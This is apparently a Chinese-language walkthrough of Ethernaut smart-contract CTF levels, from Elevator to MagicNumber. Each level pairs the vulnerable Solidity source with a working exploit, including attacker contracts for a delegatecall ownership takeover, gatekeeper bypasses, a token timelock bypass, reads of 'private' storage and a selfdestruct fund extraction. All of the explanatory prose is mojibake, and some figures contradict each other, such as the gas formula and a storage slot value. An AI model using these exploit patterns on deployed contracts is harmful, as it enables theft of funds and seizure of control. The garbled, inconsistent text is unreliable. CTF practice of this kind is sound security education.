reach the top of your building Source123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; Analyse é€šå…³æ¡ä»¶æ˜¯ä½¿ contract.top = true Building æŽ¥å£ä¸­å£°æ˜Žäº† isLastFloor å‡½æ•°ï¼Œç”¨æˆ·å¯è‡ªè¡Œç¼–å†™ åœ¨ä¸»åˆçº¦ä¸­ï¼Œå…ˆè°ƒç”¨ building.isLastFloor(floor) è¿›è¡Œ if åˆ¤æ–­ï¼Œç„¶åŽå°† building.isLastFloor(floor) èµ‹å€¼ç»™ top ã€‚è¦ä½¿ top = ture ï¼Œåˆ™ building.isLastFloor(floor) ç¬¬ä¸€æ¬¡è°ƒç”¨éœ€è¿”å›ž false ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨è¿”å›ž true æ‰€ä»¥å°±æœ‰äº†æ€è·¯ï¼šè®¾ç½®ä¸€ä¸ªåˆå§‹å€¼ä¸º true çš„å˜é‡ï¼Œæ¯æ¬¡è°ƒç”¨ isLastFloor() æ—¶ï¼Œå°†å…¶å–åå†è¿”å›ž ä½†æ˜¯ï¼Œé¢˜ç›®åœ¨å£°æ˜Ž isLastFloor æ—¶ï¼Œèµ‹äºˆäº† view å±žæ€§ï¼Œview è¡¨ç¤ºå‡½æ•°ä¼šè¯»å–åˆçº¦å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿®æ”¹ä»»ä½•åˆçº¦çš„çŠ¶æ€ çœ‹äº†ä¸‹é¢˜ç›®çš„æç¤ºSometimes solidity is not good at keeping promises. ç¿»é˜…äº†æ–‡æ¡£ï¼Œæ‰¾åˆ°å¯¹ view çš„æè¿°ï¼šview functions: The compiler does not enforce yet that a view method is not modifying state. æ„æ€æ˜¯å½“å‰ Solidity ç¼–è¯‘å™¨æ²¡æœ‰å¼ºåˆ¶æ‰§è¡Œ view å‡½æ•°ä¸èƒ½ä¿®æ”¹çŠ¶æ€ï¼Œæ‰€ä»¥ä¸Šè¿°åšæ³•å°±æ˜¯å¯è¡Œçš„1234567891011121314151617181920212223242526272829303132pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract hack &#123; address instance_address = 0x89fa2727ad30129f657994117323f7e15b3c626a; Elevator e = Elevator(instance_address); bool public flag = true; function isLastFloor(uint) public returns (bool)&#123; flag = !flag; return flag; &#125; function exploit() public&#123; e.goTo(123); &#125;&#125; è°ƒç”¨ exploit() å³å¯ PrivacyRequire Unlock this contract to beat the level Source123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; Analyse ä¹‹å‰ Vault é¢˜ç›®çš„å‡çº§ç‰ˆï¼Œè¿˜æ˜¯ä¸€æ ·ï¼Œç”¨ getStorageAt() æŠŠé“¾ä¸Šçš„æ•°æ®è¯»å‡ºæ¥ Solution12345678910await web3.eth.getStorageAt(instance, 0, function(x,y)&#123;console.info(y);&#125;)// 0x000000000000000000000000000000000000000000000000000000df9dff0a01await web3.eth.getStorageAt(instance, 1, function(x,y)&#123;console.info(y);&#125;)// 0x85b05e35e73af32ed1948f0a1a58d8a67e449f77eb22222decfef426f1936586await web3.eth.getStorageAt(instance, 2, function(x,y)&#123;console.info(y);&#125;)// 0x9daa83d6f3dbb320583dc59ed67813a5adc473d0d2ff18c0be08ef1a46a037b0await web3.eth.getStorageAt(instance, 3, function(x,y)&#123;console.info(y);&#125;)// 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697await web3.eth.getStorageAt(instance, 4, function(x,y)&#123;console.info(y);&#125;)// 0x0000000000000000000000000000000000000000000000000000000000000000 å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸€ä¸ªå­˜å‚¨ä½æ˜¯ 32 ä¸ªå­—èŠ‚ã€‚æ ¹æ® Solidity ä¼˜åŒ–è§„åˆ™ï¼Œå½“å˜é‡æ‰€å ç©ºé—´å°äºŽ 32 å­—èŠ‚æ—¶ï¼Œä¼šä¸ŽåŽé¢çš„å˜é‡å…±äº«ç©ºé—´ï¼Œå¦‚æžœåŠ ä¸ŠåŽé¢çš„å˜é‡ä¹Ÿä¸è¶…è¿‡ 32 å­—èŠ‚çš„è¯ï¼Œé™¤åŽ» ID å¸¸é‡æ— éœ€å­˜å‚¨ï¼š bool public locked = true å  1 å­—èŠ‚ -&gt; 01 uint8 private flattening = 10 å  1 å­—èŠ‚ -&gt; 0a uint8 private denomination = 255 å  1 å­—èŠ‚ -&gt; ff uint16 private awkwardness = uint16(now) å  2 å­—èŠ‚ -&gt; df9d åˆšå¥½å¯¹åº”äº†ç¬¬ä¸€ä¸ªå­˜å‚¨ä½çš„ df9dff0a0a æ‰€ä»¥ data[2] åº”è¯¥åœ¨ç¬¬å››ä¸ªå­˜å‚¨ä½ 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697 Gatekeeper OneRequire Make it past the gatekeeper and register as an entrant to pass this level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract GatekeeperOne &#123; using SafeMath for uint256; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas.mod(8191) == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse æ»¡è¶³ä¸‰ä¸ª modifier æ¡ä»¶å³å¯ gateOne å¾ˆç®€å•ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹åˆçº¦è°ƒç”¨ enter å³å¯ gateTwo éœ€è¦æ»¡è¶³ msg.gas % 8191 == 0 msg.gas æ˜¯ remaining gas ï¼Œåœ¨ remix çš„ Javascript VM çŽ¯å¢ƒä¸‹è¿›è¡Œ Debugï¼Œ åœ¨ Step detail å¯ä»¥çœ‹åˆ°è¿™ä¸ªå˜é‡ï¼Œå‡è®¾åœ¨è¿›å…¥ enter ä¹‹å‰çš„ remaining gas = 81910 è°ƒè¯•åˆ° gateTwo çš„ msg.gas åœ°æ–¹ï¼Œæ­¤æ—¶ remaining gas = 81697 é‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹é—´æ¶ˆè€—çš„ gas = 81910 - 81697ï¼ŒåŠ ä¸Š gas æœ¬èº«æ¶ˆè€—çš„ 2 å³å¯ï¼Œæ‰€ä»¥ä¸ºäº†æ»¡è¶³ gateTwoï¼Œåœ¨è¿›å…¥ enter ä¹‹å‰çš„ gas å¯ä»¥è®¾ç½®ä¸º 81910-91697+81910+2 gateThree ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæœ€åŽçš„é€»è¾‘æ˜¯å°† tx.origin å€’æ•°ä¸‰å››å­—èŠ‚æ¢æˆ 0000 å³å¯ï¼Œå¯ä»¥é€šè¿‡ bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF å®žçŽ° Solution1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.18; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; contract MyAgent &#123; GatekeeperOne c; function MyAgent(address _c) &#123; c = GatekeeperOne(_c); &#125; function exploit() &#123; bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff; c.enter.gas(81910-81697+81910+2)(_gateKey); &#125;&#125; è°ƒç”¨ exploit() å³å¯ Gatekeeper TwoRequire Register as an entrant to pass this level Source12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125; Analyse æ»¡è¶³ä¸‰ä¸ª modifier å³å¯ gateOne å¾ˆç®€å•ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹åˆçº¦è°ƒç”¨ enter å³å¯ gateThree æ¯•ç«Ÿç®€å•ï¼Œç›´æŽ¥å¼‚æˆ–é€†è¿ç®— _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)) gateTwo æ¯”è¾ƒæœ‰æŠ€å·§æ€§ï¼Œç”¨äº† å†…è”æ±‡ç¼– çš„å†™æ³•ï¼Œç¿»äº†ä¸€ä¸‹æ–‡æ¡£ https://ethereum.github.io/yellowpaper/paper.pdf ï¼š caller : Get caller address. extcodesize : Get size of an accountâ€™s code. æŒ‰ç…§é¢˜ç›®çš„æ„æ€ï¼Œè¦ä½¿å½“å‰åˆçº¦ä»£ç åŒºä¸ºç©ºï¼Œæ˜¾ç„¶ä¸Žè§£é¢˜æ˜¯çŸ›ç›¾çš„ï¼Œä»”ç»†è¯»æ–‡æ¡£ï¼Œæœ‰ä¸€äº›ç»†èŠ‚ Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.â€¦â€¦During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code. ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ‰§è¡Œåˆå§‹åŒ–ä»£ç ï¼ˆæž„é€ å‡½æ•°ï¼‰ï¼Œè€Œæ–°çš„åŒºå—è¿˜æœªæ·»åŠ åˆ°é“¾ä¸Šçš„æ—¶å€™ï¼Œæ–°çš„åœ°å€å·²ç»ç”Ÿæˆï¼Œç„¶è€Œä»£ç åŒºä¸ºç©ºï¼Œæ­¤æ—¶ï¼Œè°ƒç”¨ EXTCODESIZE() è¿”å›žä¸º 0 é‚£ä¹ˆï¼Œåªéœ€è¦åœ¨ç¬¬ä¸‰æ–¹åˆçº¦çš„æž„é€ å‡½æ•°ä¸­è°ƒç”¨é¢˜ç›®åˆçº¦ä¸­çš„ enter() å³å¯ Solution12345678910111213141516171819202122232425262728293031323334353637pragma solidity ^0.4.18;contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125;contract hack &#123; function hack(address _c) &#123; GatekeeperTwo c = GatekeeperTwo(_c); bytes8 _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)); c.enter(_gateKey); &#125;&#125; ç›´æŽ¥éƒ¨ç½²åˆçº¦ hack å³å¯ Naught CoinRequire Complete this level by getting your token balance to 0. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'; contract NaughtCoin is StandardToken &#123; using SafeMath for uint256; string public constant name = 'NaughtCoin'; string public constant symbol = '0x0'; uint public constant decimals = 18; uint public timeLock = now + 10 years; uint public INITIAL_SUPPLY = (10 ** decimals).mul(1000000); address public player; function NaughtCoin(address _player) public &#123; player = _player; totalSupply_ = INITIAL_SUPPLY; balances[player] = INITIAL_SUPPLY; Transfer(0x0, player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) lockTokens public returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(now &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; Analyse æ ¹æ®é¢˜æ„ï¼Œéœ€è¦å°†è‡ªå·±çš„ balance æ¸…ç©ºã€‚åˆçº¦æä¾›äº† transfer() è¿›è¡Œè½¬è´¦ï¼Œä½†æœ‰ä¸€ä¸ª modifier lockTokens() é™åˆ¶ï¼Œåªæœ‰ 10 å¹´åŽæ‰èƒ½è°ƒç”¨ transfer() æ³¨æ„è¯¥åˆçº¦æ˜¯ StandardToken çš„å­åˆçº¦ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™äº† The ERC20 Spec å’Œ The OpenZeppelin codebase åœ¨å­åˆçº¦æ‰¾ä¸å‡ºæ›´å¤šä¿¡æ¯çš„æ—¶å€™ï¼ŒæŠŠç›®å…‰æ›´å¤šæ”¾åˆ°çˆ¶åˆçº¦ StandardToken.sol å’ŒæŽ¥å£ä¸Š åœ¨ The ERC20 Spec ä¸­ï¼Œé™¤äº† transfer() ä¹‹å¤–ï¼Œè¿˜æœ‰ transferFrom() å‡½æ•°ä¹Ÿå¯ä»¥è¿›è¡Œè½¬è´¦ ç›´æŽ¥çœ‹çˆ¶åˆçº¦ StandardToken.sol 12345678910111213contract StandardToken &#123; using ERC20Lib for ERC20Lib.TokenStorage; ERC20Lib.TokenStorage token; ... function transfer(address to, uint value) returns (bool ok) &#123; return token.transfer(to, value); &#125; function transferFrom(address from, address to, uint value) returns (bool ok) &#123; return token.transferFrom(from, to, value); &#125; ...&#125; è·Ÿè¿› ERC20Lib.sol 1234567891011121314151617181920212223242526library ERC20Lib &#123; ... function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123; self.balances[msg.sender] = self.balances[msg.sender].minus(_value); self.balances[_to] = self.balances[_to].plus(_value); Transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123; var _allowance = self.allowed[_from](msg.sender); self.balances[_to] = self.balances[_to].plus(_value); self.balances[_from] = self.balances[_from].minus(_value); self.allowed[_from](msg.sender) = _allowance.minus(_value); Transfer(_from, _to, _value); return true; &#125; ... function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123; self.allowed[msg.sender](_spender) = _value; Approval(msg.sender, _spender, _value); return true; &#125;&#125; å¯ä»¥ç›´æŽ¥è°ƒç”¨è¿™ä¸ª transferFrom ï¼Œä½†æ˜¯ transferFrom éœ€è¦ msg.sender èŽ·å¾—æŽˆæƒï¼Œç”±äºŽæˆ‘ä»¬å°±æ˜¯åˆçº¦çš„ owner ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±è°ƒç”¨ approve ç»™è‡ªå·±æŽˆæƒ Solution12await contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())await contract.transferFrom(player, instance, (await contract.INITIAL_SUPPLY()).toNumber()) PreservationRequire This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored. The goal of this level is for you to claim ownership of the instance you are given. Source123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; Analyse delegatecall å®šä¹‰ï¼š.delegatecall(â€¦) returns (bool): issue low-level DELEGATECALL, returns false on failure, forwards all available gas, adjustable delegatecall ä¸Ž call åŠŸèƒ½ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºŽ delegatecall ä»…ä½¿ç”¨ç»™å®šåœ°å€çš„ä»£ç ï¼Œå…¶å®ƒä¿¡æ¯åˆ™ä½¿ç”¨å½“å‰åˆçº¦(å¦‚å­˜å‚¨ï¼Œä½™é¢ç­‰ç­‰)ã€‚æ³¨æ„ delegatecall æ˜¯å±é™©å‡½æ•°ï¼Œå®ƒå¯ä»¥å®Œå…¨æ“ä½œå½“å‰åˆçº¦çš„çŠ¶æ€ï¼Œå¯ä»¥å‚è€ƒç¬¬7é¢˜ Delegation delegateCall æ–¹æ³•ä»…ä»…ä½¿ç”¨ç›®æ ‡åˆçº¦çš„ä»£ç ï¼Œ å…¶ä½™çš„ storage ç­‰æ•°æ®å‡ä½¿ç”¨è‡ªå·±çš„ï¼Œè¿™å°±ä½¿å¾—æŸäº›è®¿å­˜æ“ä½œä¼šé”™è¯¯çš„å¤„ç†å¯¹è±¡ æ‰€ä»¥è¿™ä¸ªé¢˜å¯ä»¥è¿™æ ·è§£å†³ï¼š æˆ‘ä»¬è°ƒç”¨ Preservation çš„ setFirstTime å‡½æ•°å®žé™…é€šè¿‡ delegatecall æ‰§è¡Œäº† LibraryContract çš„ setTime å‡½æ•°ï¼Œä¿®æ”¹äº† slot 1 ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹äº† timeZone1Library å˜é‡ è¿™æ ·ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨ setFirstTime å°† timeZone1Library å˜é‡ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„åˆçº¦çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨ setFirstTime å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»»æ„ä»£ç äº† Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125;contract attack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c; Preservation target = Preservation(instance_address); function attack1() &#123; target.setFirstTime(uint(address(this))); &#125; function attack2() &#123; target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2)); &#125; function setTime(uint _time) public &#123; timeZone1Library = address(_time); timeZone2Library = address(_time); owner = address(_time); &#125;&#125; å…ˆè°ƒç”¨ attack1() ï¼Œå†è°ƒç”¨ attack2() å³å¯ LockedRequire This name registrar is locked and will not accept any new names to be registered. Unlock this registrar to beat the level. Source123456789101112131415161718192021222324252627pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125; Analyse å…¸åž‹çš„åˆ©ç”¨ struct é»˜è®¤æ˜¯ storage çš„é¢˜ç›® å‡½æ•°ä¸­å£°æ˜Žçš„ newRecord ç»“æž„ä½“ä¿®æ”¹ name å’Œ mappedAddress å®žé™…åˆ†åˆ«æ”¹çš„æ˜¯ unlocked å’Œ bytes32 name æ‰€ä»¥æŠŠ name å¯¹åº”çš„ slot 0 çš„å€¼æ”¹æˆ 1 å°±è¡Œäº† Solution1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125;contract hack &#123; address instance_addr = 0xfce5ca4942678982889e6c9934a2afb02c670098; Locked target = Locked(instance_addr); function exploit() &#123; target.register(1, tx.origin); &#125;&#125; è°ƒç”¨ exploit() å³å¯ RecoveryRequire A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address å…¶å®žç®€å•æ¥è¯´å°±æ˜¯å·²çŸ¥ä¸€ä¸ª Recovery åˆçº¦åœ°å€ï¼Œæ¢å¤ä¸€ä¸‹å®ƒåˆ›å»ºçš„ SimpleToken åœ°å€ï¼Œç„¶åŽå°† 0.5 eth ä»Žä¸¢å¤±åœ°å€çš„åˆçº¦ä¸­æå‡ºå³å¯ Source12345678910111213141516171819202122232425262728293031323334353637383940414243pragma solidity ^0.4.23;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Recovery &#123; //generate tokens function generateToken(string _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125;&#125;contract SimpleToken &#123; using SafeMath for uint256; // public variables string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string _name, address _creator, uint256 _initialSupply) public &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens function() public payable &#123; balances[msg.sender] = msg.value.mul(10); &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address _to) public &#123; selfdestruct(_to); &#125;&#125; Analyse åŒºå—é“¾ä¸Šæ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯å…¬å¼€çš„ï¼Œç›´æŽ¥ä¸Š ropsten æµ‹è¯•ç½‘çš„å®˜æ–¹ç½‘é¡µæŸ¥å°±å¯ä»¥äº† Solutionæ–¹æ³•ä¸€ ä»Ž console æ‰¾åˆ°å®žä¾‹åœ°å€ï¼š0xd29fcc4b193a576a17af9194d706b17ce5da24e2 é€šè¿‡ ropsten.etherscan.io æ‰¾åˆ°è¿™ä¸ªå®žä¾‹çš„äº¤æ˜“ä¿¡æ¯ï¼šhttps://ropsten.etherscan.io/address/0xd29fcc4b193a576a17af9194d706b17ce5da24e2#internaltx å†é€šè¿‡äº¤æ˜“ä¿¡æ¯æ‰¾åˆ°ç”Ÿäº§åˆçº¦ lost contract çš„åœ°å€: 0x77a70a61a077e3aee72404e0e70211bfa72e962b åœ¨ remix éƒ¨ç½² SimpleToken ï¼Œä½¿ç”¨ At address æŒ‡å®š lost contract çš„åœ°å€ï¼Œç„¶åŽæ‰§è¡Œ destroy(play_address) å³å¯ æŸ¥çœ‹åˆçº¦åœ°å€å¯ä»¥çœ‹åˆ°å·²ç»è¢«é”€æ¯https://ropsten.etherscan.io/address/0x77a70a61a077e3aee72404e0e70211bfa72e962b#internaltx ä¸€äº›åˆ†æž æ–¹æ³•ä¸€æäº¤ä¹‹åŽï¼ŒZeppelin ç»™å‡ºäº†åŽŸç†å¦‚ä¸‹ï¼š Contract addresses are deterministic and are calculated by keccack256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.An interesting blog post by Martin Swende details potential use cases of this.If youâ€™re going to implement this technique, make sure you donâ€™t miss the nonce, or your funds will be lost forever. åŽŸæ¥é¢˜ç›®çš„è€ƒç‚¹æ˜¯åˆçº¦åœ°å€å¯è®¡ç®—ï¼Œæ‰€ä»¥è¿™é¢˜æœ‰ä¸¤ç§è§£æ³• æ–¹æ³•äºŒ å‚è€ƒ https://www.freebuf.com/articles/blockchain-articles/179662.html å‚è€ƒ https://github.com/ethereum/wiki/wiki/RLP 12345678910111213141516171819202122232425def rlp_encode(input): if isinstance(input,str): if len(input) == 1 and ord(input) &lt; 0x80: return input else: return encode_length(len(input), 0x80) + input elif isinstance(input,list): output = '' for item in input: output += rlp_encode(item) return encode_length(len(output), 0xc0) + outputdef encode_length(L,offset): if L &lt; 56: return chr(L + offset) elif L &lt; 256**8: BL = to_binary(L) return chr(len(BL) + offset + 55) + BL else: raise Exception("input too long")def to_binary(x): if x == 0: return '' else: return to_binary(int(x / 256)) + chr(x % 256)print rlp_encode(["d29fcc4b193a576a17af9194d706b17ce5da24e2".decode('hex'),"01".decode('hex')]).encode('hex') ç»“æžœæ˜¯ d694d29fcc4b193a576a17af9194d706b17ce5da24e201 æ‹¿åˆ° solidity è®¡ç®—åœ°å€ 123456pragma solidity ^0.4.18;contract test&#123; function func() view returns (address)&#123; return address(keccak256(0xd694d29fcc4b193a576a17af9194d706b17ce5da24e201)); &#125;&#125; å¯ä»¥çœ‹åˆ°è®¡ç®—çš„åœ°å€å’Œæ–¹æ³•ä¸€æ˜¯ä¸€æ ·çš„ MagicNumberRequireTo solve this level, you only need to provide the Ethernaut with a â€œSolverâ€, a contract that responds to â€œwhatIsTheMeaningOfLife()â€ with the right number.Easy right? Wellâ€¦ thereâ€™s a catch.The solverâ€™s code needs to be really tiny. Really reaaaaaallly tiny. Like freakinâ€™ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. Thatâ€™s right: Raw EVM bytecode.Good luck! é¢˜ç›®çš„æ„æ€å°±æ˜¯éƒ¨ç½²ä¸€ä¸ªåˆçº¦ Solver ï¼Œè¦æ±‚åœ¨è¢«è°ƒç”¨ whatIsTheMeaningOfLife() å‡½æ•°æ—¶è¿”å›ž 42 å°±å¯ä»¥äº†ï¼Œä½†æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯ä¸èƒ½è¶…è¿‡ 10 ä¸ª opcode Source123456789101112131415161718192021222324pragma solidity ^0.4.24;contract MagicNum &#123; address public solver; constructor() public &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\_______/\\\\\\\\\_____ __________/\\\\\_____/\\\///////\\\___ ________/\\\/\\\____\///______\//\\\__ ______/\\\/\/\\\______________/\\\/___ ____/\\\/__\/\\\___________/\\\//_____ __/\\\\\\\\\\\\\\\\_____/\\\//________ _\///////////\\\//____/\\\/___________ ___________\/\\\_____/\\\\\\\\\\\\\\\_ ___________\///_____\///////////////__ */&#125; Analyseå¤šè¯´çš„è¯ å‚è€ƒ https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 å‚è€ƒ https://f3real.github.io/Ethernaut_wargame19.html 